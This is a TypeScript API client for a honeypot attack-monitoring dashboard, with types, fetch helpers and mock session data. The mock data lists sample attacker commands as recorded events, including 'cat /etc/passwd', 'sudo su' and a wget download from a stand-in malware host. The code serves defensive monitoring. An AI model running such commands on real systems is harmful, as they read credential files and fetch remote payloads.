
import { toast } from "@/hooks/use-toast";

// Base URL for the API
const API_BASE_URL = import.meta.env.VITE_API_URL || "http://localhost:5000/api";

// Types
export interface Session {
  session_id: string;
  src_ip: string;
  sensor: string;
  timestamp: string;
  duration: string | null;
  events: SessionEvent[];
}

export interface SessionEvent {
  message: string;
  ml_output?: string;
  timestamp: string;
}

export interface SessionsResponse {
  sessions: Session[];
  total: number;
}

export interface StatsResponse {
  total_sessions: number;
  active_sessions: number;
  unique_ips: number;
  command_count: number;
  threat_level: string;
}

export interface MLAnalysisResponse {
  command_categories: Record<string, number>;
  command_trend: Array<{ date: string; count: number }>;
  top_commands: Array<{ command: string; count: number }>;
}

export interface SessionMLAnalysisResponse {
  command_categories: Record<string, number>;
  commands: Array<{ 
    command: string; 
    ml_output: string; 
    timestamp: string;
  }>;
}

// Utility function for API requests
async function apiRequest<T>(
  endpoint: string,
  options: RequestInit = {}
): Promise<T> {
  try {
    const response = await fetch(`${API_BASE_URL}${endpoint}`, {
      ...options,
      headers: {
        "Content-Type": "application/json",
        ...options.headers,
      },
    });

    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.message || `API error: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    console.error("API request failed:", error);
    throw error;
  }
}

// API functions
export async function fetchSessions(
  page = 1,
  limit = 10
): Promise<SessionsResponse> {
  return apiRequest<SessionsResponse>(`/sessions?page=${page}&limit=${limit}`);
}

export async function fetchSession(sessionId: string): Promise<Session> {
  return apiRequest<Session>(`/sessions/${sessionId}`);
}

export async function fetchStats(): Promise<StatsResponse> {
  return apiRequest<StatsResponse>("/stats");
}

export async function fetchMLAnalysis(): Promise<MLAnalysisResponse> {
  return apiRequest<MLAnalysisResponse>("/ml/analysis");
}

export async function fetchSessionML(sessionId: string): Promise<SessionMLAnalysisResponse> {
  return apiRequest<SessionMLAnalysisResponse>(`/sessions/${sessionId}/ml`);
}

export async function fetchCommandAnalysis(): Promise<any> {
  return apiRequest<any>("/ml/commands");
}

export async function fetchAttackerProfiles(): Promise<any> {
  return apiRequest<any>("/attackers");
}

// Mock API functions for development (will connect to real backend when ready)
export async function mockFetchSessions(): Promise<SessionsResponse> {
  return {
    sessions: Array.from({ length: 15 }, (_, i) => ({
      session_id: `session_${i + 1}`,
      src_ip: `192.168.1.${i + 1}`,
      sensor: "honeypot-1",
      timestamp: new Date(Date.now() - i * 3600000).toISOString(),
      duration: i === 0 ? null : `${Math.floor(Math.random() * 300)}s`,
      events: Array.from({ length: Math.floor(Math.random() * 10) + 1 }, (_, j) => ({
        message: `Command execution: ${["ls -la", "cat /etc/passwd", "uname -a", "wget http://malware.com/payload"][j % 4]}`,
        ml_output: ["System Info", "Navigation", "Network Scan", "User Enumeration"][j % 4],
        timestamp: new Date(Date.now() - i * 3600000 - j * 60000).toISOString(),
      })),
    })),
    total: 50,
  };
}

export async function mockFetchStats(): Promise<StatsResponse> {
  return {
    total_sessions: 153,
    active_sessions: 3,
    unique_ips: 87,
    command_count: 642,
    threat_level: "Medium",
  };
}

export async function mockFetchMLAnalysis(): Promise<MLAnalysisResponse> {
  return {
    command_categories: {
      "System Info": 124,
      "Navigation": 235,
      "Network Scan": 86,
      "User Enumeration": 197,
    },
    command_trend: Array.from({ length: 7 }, (_, i) => ({
      date: new Date(Date.now() - i * 86400000).toISOString().split("T")[0],
      count: Math.floor(Math.random() * 50) + 20,
    })).reverse(),
    top_commands: [
      { command: "ls -la", count: 87 },
      { command: "cat /etc/passwd", count: 65 },
      { command: "uname -a", count: 43 },
      { command: "wget", count: 38 },
      { command: "curl", count: 31 },
    ],
  };
}

// Mock function for session-specific ML analysis
export async function mockFetchSessionML(sessionId: string): Promise<SessionMLAnalysisResponse> {
  return {
    command_categories: {
      "System Info": Math.floor(Math.random() * 20) + 5,
      "Navigation": Math.floor(Math.random() * 30) + 10,
      "Network Scan": Math.floor(Math.random() * 15) + 3,
      "User Enumeration": Math.floor(Math.random() * 25) + 8,
    },
    commands: Array.from({ length: 15 }, (_, i) => ({
      command: ["ls -la", "cat /etc/passwd", "uname -a", "wget http://malware.com/payload", "cd /tmp", "sudo su"][i % 6],
      ml_output: ["System Info", "Navigation", "Network Scan", "User Enumeration"][i % 4],
      timestamp: new Date(Date.now() - i * 60000).toISOString(),
    })),
  };
}

// Always use mock data for development to avoid API errors
export const fetchSessionsData = mockFetchSessions;
export const fetchStatsData = mockFetchStats;
export const fetchMLAnalysisData = mockFetchMLAnalysis;
export const fetchSessionMLData = mockFetchSessionML;
